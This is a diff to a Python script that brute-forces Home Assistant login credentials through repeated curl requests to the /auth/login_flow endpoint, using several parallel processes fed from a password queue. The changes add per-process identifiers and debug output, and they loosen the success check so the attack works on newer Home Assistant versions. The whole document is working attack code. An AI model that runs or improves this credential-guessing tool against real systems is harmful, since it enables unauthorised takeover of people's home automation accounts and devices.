@@ -24,6 +24,7 @@ def get_flow_id(host):
     headers = "-H \'Content-Type: text/plain;charset=UTF-8\'"
     host = host + "/auth/login_flow"
     result = subprocess.run(["curl", "-d", data, headers, host, "-s"], stdout=subprocess.PIPE)
+    print(result);
     flow_id = ""
     try:
         json_object = json.loads(result.stdout.decode())
@@ -42,7 +43,7 @@ def get_flow_id(host):
         curl -d '{"username":"admin","password":"pass","client_id":"http://ip:port/"}' -H 'Content-Type: text/plain;charset=UTF-8' ip:port/auth/login_flow/[flow_id]
     This method runs the above curl command repeatedly with different credential each time until it finds a valid credential.
 """
-def bruceforce(flow_id, host, username, passwords_queue, credential_found, queue_ended):
+def bruceforce(flow_id, host, username, passwords_queue, credential_found, queue_ended, process_id):
     client_id = host
     host = host + "/auth/login_flow/" + flow_id
     username = "\""+ username +"\""
@@ -57,16 +58,20 @@ def bruceforce(flow_id, host, username, passwords_queue, credential_found, queue
             print("Attempt", count, ": username", username, "password", password)
             curl_output = subprocess.run(["curl", "-d", data, host, "-s"], stdout=subprocess.PIPE)
             response = curl_output.stdout.decode()
-            if "\"type\": \"create_entry\"" in response or "\"step_id\": \"mfa\"" in response:
-                print("-------------------------------------------------------------------------------")
-                print("Successfully authenticated! username:", username, "password:", password, "@ Attempt", count)
-                print("-------------------------------------------------------------------------------")
+            #print(response)
+            # older version of homeassistant (9.1 or 9.2)
+			#if "\"type\": \"create_entry\"" in response or "\"step_id\": \"mfa\"" in response:
+            if "invalid_auth" not in response and "Invalid flow specified" not in response:
+                print("-----------------------------------------------------------------------------------------------")
+                print("Process", process_id,"- Successfully authenticated! username:", username, "password:", password, "@ Attempt", count)
+                print("-----------------------------------------------------------------------------------------------")
                 credential_found.value = 42  # any number will make bool(credential_found.value) True
                 break
             elif bool(queue_ended.value):
-                print("-------------------------")
-                print("No valid credential found")
-                print("-------------------------")
+                if not bool(credential_found.value):
+                    print("-------------------------")
+                    print("Process", process_id,"- No valid credential found")
+                    print("-------------------------")
                 break
         if bool(credential_found.value):
             break
@@ -168,7 +173,7 @@ def main():
     # Initialize the bruce-force processes
     for i in range(num_of_bruteforces):
         p = multiprocessing.Process(target=bruceforce,
-                                    args=(flow_id, host, username, passwords_queue, credential_found, queue_ended))
+                                    args=(flow_id, host, username, passwords_queue, credential_found, queue_ended, i))
         p.start()
         bruteforce_processes.append(p)
 
